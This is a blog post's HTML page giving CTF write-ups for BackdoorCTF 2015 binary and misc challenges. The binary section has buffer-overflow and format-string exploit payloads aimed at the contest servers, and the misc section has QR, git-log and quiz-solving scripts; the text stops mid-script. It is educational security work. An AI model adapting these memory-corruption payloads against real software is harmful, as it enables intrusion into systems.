@@ -1,0 +1,1249 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>BackdoorCTF 2015 – Binary + Misc - Hacking Tube 2.0</title>
+<meta name="description" content="BackdoorCTF 2015For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some “imagination”…">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="BackdoorCTF 2015 – Binary + Misc">
+<meta property="og:url" content="http://0.0.0.0:4000/backdoorctf-2015-binary-misc/">
+
+
+  <meta property="og:description" content="BackdoorCTF 2015For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some “imagination”…">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-05-08T01:11:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/backdoorctf-2015-binary-misc/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="BackdoorCTF 2015 – Binary + Misc">
+    <meta itemprop="description" content="BackdoorCTF 2015For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some “imagination”…">
+    <meta itemprop="datePublished" content="May 08, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">BackdoorCTF 2015 – Binary + Misc
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><a href="https://backdoor.sdslabs.co/">BackdoorCTF 2015</a><br />
+For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some <strong>“imagination”</strong>…</p>
+
+<p>In this writeup, I’ll post the solutions of all the binary challenges and the misc challenges that I solved in the CTF.<br />
+<!-- more --></p>
+
+<h1 id="binary">Binary</h1>
+<h2 id="echo">echo</h2>
+<p>Basic BOF. Launch IDA Pro and we can see there’s a gets() function in the main function. Just overwrite the return address to control the <code class="highlighter-rouge">eip</code> jump to the <code class="highlighter-rouge">sample()</code> function, which cat the flag.<br />
+payload: <code class="highlighter-rouge">python -c 'print "A"*62+"\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002</code></p>
+
+<h2 id="team">team</h2>
+<p>Basic format string. To be honest I don’t think this challenge worth 600 pt…<br />
+The flag’s on the stack. Just leak it with the format string vulnerability, wrote a script concat the string and bang, CTF<br />
+payload: <code class="highlighter-rouge">%10$p.%11$p.%12$p.........%25$p</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">temp</span> <span class="o">=</span> <span class="p">[</span><span class="mi">35663364</span><span class="p">,</span><span class="mi">64363031</span><span class="p">,</span><span class="o">................................</span><span class="p">]</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">temp</span><span class="p">:</span>
+	<span class="n">flag</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span> <span class="s">"flag:"</span><span class="p">,</span> <span class="n">flag</span>
+</code></pre></div></div>
+
+<h2 id="forgot">forgot</h2>
+<p>Another binary with the BOF vulnerability. It’s a service that ask user to input their name and email address, and check the email address is whether a validate email address or not. 
+Inspect the binary with IDA Pro, we found the following line has the BOF vulnerability:
+<code class="highlighter-rouge">__isoc99_scanf("%s", &amp;v11); // v11 = [bp-0x74]</code>
+Moreover, there’s a for loop with a switch-case in it to check the email address:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>  <span class="p">{</span>
+    <span class="n">v9</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v9</span> <span class="o">&gt;=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v11</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">v23</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="p">:.........</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="p">:.........</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>To bypass the email address validation is simple, we just insert null byte in the beginning of the input, the <code class="highlighter-rouge">strlen()</code> will consider the string’s length is 0 and stop the checking.</p>
+
+<p>I try to overwrite the return address first, which cause the program crash. So I switch to the IDA view and check the assembly, here’s what I found:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:08048A58                 sub     dword ptr [esp+78h], 1
+.text:08048A5D                 mov     eax, [esp+78h]
+.text:08048A61                 mov     eax, [esp+eax*4+30h]
+.text:08048A65                 call    eax
+</code></pre></div></div>
+
+<p>So apparently before the main function end, it does something really interesting. The program took a value that store on the stack, do some calculation, and store it in the eax before calling it. If we can make the value that store at <code class="highlighter-rouge">[esp+78h]</code> 0, we can call whatever we want by controling the value store at <code class="highlighter-rouge">[esp+30h]</code>. But who should we call? After checking the text view in IDA Pro, I found that there’s one function that IDA Pro didn’t decompile it into pseudo code.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:080486CC                 push    ebp
+.text:080486CD                 mov     ebp, esp
+.text:080486CF                 sub     esp, 58h
+.text:080486D2                 mov     dword ptr [esp+0Ch], offset a_Flag ; "./flag"
+.text:080486DA                 mov     dword ptr [esp+8], offset aCatS ; "cat %s"
+.text:080486E2                 mov     dword ptr [esp+4], 32h
+.text:080486EA                 lea     eax, [ebp-3Ah]
+.text:080486ED                 mov     [esp], eax
+.text:080486F0                 call    _snprintf
+.text:080486F5                 lea     eax, [ebp-3Ah]
+.text:080486F8                 mov     [esp], eax
+.text:080486FB                 call    _system
+.text:08048700                 leave
+.text:08048701                 retn
+</code></pre></div></div>
+
+<p>So just overwrite the stack, make <code class="highlighter-rouge">eax</code> be calculated to <code class="highlighter-rouge">0x080486CC</code>, then we can get the flag by executing the <code class="highlighter-rouge">call eax</code> instruction. Here’s the payload:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">"123</span><span class="se">\n</span><span class="s">"</span> <span class="c"># name</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x00\x00\x00\x00</span><span class="s">"</span> <span class="c"># for bypassing strlen</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">28</span> <span class="c"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcc\x86\x04\x08</span><span class="s">"</span> <span class="c"># esp+0x30, print flag function</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">68</span> <span class="c"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span> <span class="c"># esp+0x78</span>
+</code></pre></div></div>
+
+<h1 id="misc">Misc</h1>
+<h2 id="tim">TIM</h2>
+<p>We got a github page, so it’s seems like a git/forensic challenge. After cloning the repository and check the git log, we found some intereting stuff.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commit d444f3227636477902c4badc8e35a27cadab456c
+Author: Abhay Rana &lt;capt.n3m0@gmail.com&gt;
+Date:   Tue Mar 31 17:59:09 2015 +0530
+
+    Adds flag
+
+commit 009d01e1b04bf2bf2d9bebd666e8d167fae1dc1a
+Author: Abhay Rana &lt;me@captnemo.in&gt;
+Date:   Tue Mar 31 17:59:08 2015 +0530
+
+    47
+    
+    
+    - 1518
+
+commit 006d89cdd1a4ea3620bc6d4f865a2e341f5ee79a
+Author: Abhay Rana &lt;me@captnemo.in&gt;
+Date:   Tue Mar 31 17:59:08 2015 +0530
+
+    41
+    
+    
+    - 1527
+
+commit 00df98e1685e093c643657c6b68d31b9948927aa
+Author: Abhay Rana &lt;me@captnemo.in&gt;
+Date:   Tue Mar 31 17:59:08 2015 +0530
+
+    4c
+    
+........................    
+</code></pre></div></div>
+
+<p>It’s seems like they convert some characters’ ASCII code into hex values and committed it. After converting them back to the normal character, we got the following message:<br />
+<code class="highlighter-rouge">Join first two characters of each commit sha1 FLAG</code><br />
+OK, so just do whatever it says, wrote a python script extract each commit sha1’s first 2 characters and concat them, we’ll get the flag. Notice that if the first 2 characters are “00”, just ignore them.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ff</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"log"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">ff</span><span class="p">:</span>
+	<span class="k">if</span> <span class="s">"commit"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">9</span><span class="p">:]</span> <span class="o">!=</span> <span class="s">"00"</span><span class="p">:</span>
+			<span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">9</span><span class="p">])</span>
+
+<span class="k">print</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="qr">QR</h2>
+<p>It’s a service that gave us a bunch of QR codes, which require us to decode them &amp; send the answers back to the server. The QR codes are generate randomly, so we’ll have to write a script to solve them all. For me, I wrote a python script to parse the input into a 2D-array, and use the <a href="https://pillow.readthedocs.org/">Pillow</a> library to transform the input into a png image, which contains the QR code. At first I try to use some python libraries to decode the QR code, including qrtools &amp; zbar. Unfortunately, both of them weren’t very effective, the correctness are kind of awful…so I finally decide to send the file to <a href="http://zxing.org/w/decode.jspx">ZXing</a> and parse the response. This time, no error occurs. I finally got the flag after solving 100 QR codes.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">HOST</span><span class="o">=</span><span class="s">"hack2.bckdr.in"</span>
+<span class="n">PORT</span><span class="o">=</span><span class="mi">8010</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">transform</span><span class="p">(</span><span class="n">array</span><span class="p">):</span>
+    <span class="k">print</span> <span class="s">"transforming..."</span>
+    <span class="n">pixels</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">height</span><span class="p">,</span> <span class="n">width</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">array</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">array</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="k">print</span> <span class="n">height</span><span class="p">,</span> <span class="n">width</span>
+    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">height</span><span class="p">):</span>
+		<span class="n">pixels</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="mh">0xFF</span> <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">array</span><span class="p">[</span><span class="n">row</span><span class="p">]])</span>
+
+	<span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'L'</span><span class="p">,</span> <span class="p">(</span><span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">))</span>
+	<span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">height</span><span class="p">):</span>
+		<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">width</span><span class="p">):</span>
+			<span class="n">im</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">),</span> <span class="n">pixels</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">])</span>
+	
+	<span class="n">width</span><span class="p">,</span> <span class="n">height</span> <span class="o">=</span> <span class="n">width</span><span class="o">*</span><span class="mi">5</span><span class="p">,</span> <span class="n">height</span><span class="o">*</span><span class="mi">10</span>
+	<span class="n">im</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="n">resize</span><span class="p">((</span><span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">))</span>
+
+	<span class="n">im</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s">"test.png"</span><span class="p">)</span>
+	<span class="k">print</span> <span class="s">"transforming done"</span>
+
+<span class="k">def</span> <span class="nf">decode_qr</span><span class="p">():</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"test.png"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span>  <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s">'http://zxing.org/w/decode'</span><span class="p">,</span><span class="n">files</span> <span class="o">=</span>  <span class="p">{</span><span class="s">'f'</span><span class="p">:</span><span class="n">f</span><span class="p">})</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span>
+    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"Parsed Result&lt;/td&gt;&lt;td&gt;&lt;pre&gt;([0-9a-z]{64})&lt;/pre&gt;"</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">cur</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="k">print</span> <span class="s">"round:"</span><span class="p">,</span> <span class="n">cur</span><span class="o">+</span><span class="mi">1</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10240</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">r</span><span class="p">,</span> <span class="n">cur</span><span class="o">+</span><span class="mi">1</span>
+        <span class="k">if</span> <span class="s">"Oops!"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span> <span class="k">break</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">):</span> <span class="k">break</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">r</span>
+		<span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"</span><span class="err">\</span><span class="s">s{94}</span><span class="se">\n</span><span class="s">$"</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
+			<span class="k">break</span>
+
+	<span class="n">array</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">47</span><span class="p">)]</span>
+	<span class="n">index</span><span class="p">,</span> <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+
+	<span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
+		<span class="n">now</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
+		<span class="k">if</span> <span class="n">now</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span>
+			<span class="n">row</span> <span class="o">+=</span> <span class="mi">1</span>
+		<span class="k">elif</span> <span class="n">now</span> <span class="o">==</span> <span class="mi">32</span><span class="p">:</span>
+			<span class="n">array</span><span class="p">[</span><span class="n">row</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">array</span><span class="p">[</span><span class="n">row</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+			<span class="n">index</span> <span class="o">+=</span> <span class="mi">2</span>
+		<span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+
+	<span class="n">transform</span><span class="p">(</span><span class="n">array</span><span class="p">)</span>
+	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+  
+  	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	    <span class="n">answer</span> <span class="o">=</span> <span class="n">decode_qr</span><span class="p">()</span>
+      	<span class="k">print</span> <span class="n">answer</span>
+      	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span> <span class="o">==</span> <span class="mi">64</span><span class="p">:</span> <span class="k">break</span>
+
+	<span class="k">print</span> <span class="n">answer</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
+	<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
+	<span class="n">cur</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="rapidfire">RapidFire</h2>
+<p>Another service which give us a bunch of questions (<strong>200</strong> actually…) and ask us to solve all of them. The questions contains different categories, including:</p>
+
+<ol>
+  <li>Math
+    <ul>
+      <li>Nth prime</li>
+      <li>Nth Fibonacci number</li>
+      <li>Nth digit in Pi</li>
+      <li>Sum of the first Nth natural numbers</li>
+      <li>Sum of the first Nth odd numbers</li>
+      <li>Sum of the first Nth Fibonacci numbers</li>
+      <li>Value of N in binary</li>
+    </ul>
+  </li>
+  <li>Geography
+    <ul>
+      <li>Country of a city</li>
+      <li>Alpha2-code of a country</li>
+    </ul>
+  </li>
+  <li>Misc
+    <ul>
+      <li>md5 hash</li>
+      <li>Release year of a movie</li>
+    </ul>
+  </li>
+</ol>
+
+<p>To solve all these problems, I use the follwing methods (in Ruby):</p>
+
+<ol>
+  <li>Math
+    <ul>
+      <li>Nth prime –&gt; https://primes.utm.edu/nthprime/index.php</li>
+      <li>Nth Fibonacci number –&gt; just calculate it</li>
+      <li>Nth digit in Pi –&gt; http://www.eveandersson.com/pi/digits/1000000</li>
+      <li>Sum of the first Nth natural numbers –&gt; n(n+1)/2</li>
+      <li>Sum of the first Nth odd numbers –&gt; n^2</li>
+      <li>Sum of the first Nth Fibonacci numbers –&gt; fib(n+2)-1</li>
+      <li>Value of N in binary –&gt; n.to_s(2)</li>
+    </ul>
+  </li>
+  <li>Geography
+    <ul>
+      <li>Country of a city –&gt; http://maps.googleapis.com/maps/api/geocode/json</li>
+      <li>Alpha2-code of a country –&gt; wiki</li>
+    </ul>
+  </li>
+  <li>Misc
+    <ul>
+      <li>md5 hash –&gt; require ‘digest’</li>
+      <li>Release year of a movie –&gt; Rotten tomato API</li>
+    </ul>
+  </li>
+</ol>
+
+<p>Most of them are done by googling the solutions. I spent most of the time finding the solution for the last one – <strong>Release year of a movie</strong>. This one almost drive me insane. I couldn’t find a perfect solution for this kind of problem. It seems <a href="http://www.imdb.com/">IMDB</a> has no public API for us to search the movie database, and the <a href="http://developer.rottentomatoes.com/">Rotten Tomato API</a> sometimes return the wrong answer. Other movie database API are either too slow or just too crap to return the correct answers. At last I choose the Rotten Tomato API since there’s no other solution. During solving this challenge, I found that sometimes I can made it to level 19X, while failing because of the wrong release year of the movie. So I finally decide to use the following command to run the script until I pass level 200:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>ruby rapidfire.rb<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+<p>Yeah take that rapidfire =.=<br />
+<strong>And guess what? I got the flag just before the end of the CTF !!! How lucky!!!</strong></p>
+
+<p>Here’s the ruby script I use. It’s kind of dirty since I hard-code many special cases in the script:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># encoding: utf-8</span>
+<span class="nb">require</span> <span class="s1">'socket'</span>
+<span class="nb">require</span> <span class="s1">'prime'</span>
+<span class="nb">require</span> <span class="s1">'digest'</span>
+<span class="nb">require</span> <span class="s1">'net/http'</span>
+<span class="nb">require</span> <span class="s1">'json'</span>
+
+<span class="no">HOST</span><span class="o">=</span><span class="s2">"128.199.107.60"</span>
+<span class="no">PORT</span><span class="o">=</span><span class="mi">8008</span>
+
+<span class="k">def</span> <span class="nf">gen_codedb</span><span class="p">(</span><span class="n">code_db</span><span class="p">)</span>
+	<span class="n">cur_code</span> <span class="o">=</span> <span class="s2">""</span>
+	<span class="no">IO</span><span class="p">.</span><span class="nf">foreach</span><span class="p">(</span><span class="s1">'code2.txt'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
+		<span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+		<span class="k">if</span> <span class="n">line</span><span class="p">.</span><span class="nf">length</span> <span class="o">==</span> <span class="mi">0</span>
+			<span class="k">next</span>
+		<span class="k">elsif</span> <span class="n">line</span><span class="p">.</span><span class="nf">length</span> <span class="o">==</span> <span class="mi">2</span>
+			<span class="n">cur_code</span> <span class="o">=</span> <span class="n">line</span>
+		<span class="k">else</span>
+			<span class="n">code_db</span><span class="p">[</span><span class="n">line</span><span class="p">]</span> <span class="o">=</span> <span class="n">cur_code</span>
+		<span class="k">end</span>
+	<span class="k">end</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">solve_prime</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="sb">`curl -s -k -d "n=</span><span class="si">#{</span><span class="n">n</span><span class="p">.</span><span class="nf">to_i</span><span class="si">}</span><span class="sb">" https://primes.utm.edu/nthprime/index.php | grep "prime is"|tail -n 1 | awk '{print $5}' | tr -d ',.' `</span>
+	<span class="nb">p</span> <span class="n">ret</span>
+	<span class="k">return</span> <span class="n">ret</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">solve_fib</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+	<span class="n">curr_num</span><span class="p">,</span> <span class="n">next_num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span>
+	<span class="p">(</span><span class="n">n</span><span class="p">).</span><span class="nf">times</span> <span class="k">do</span>
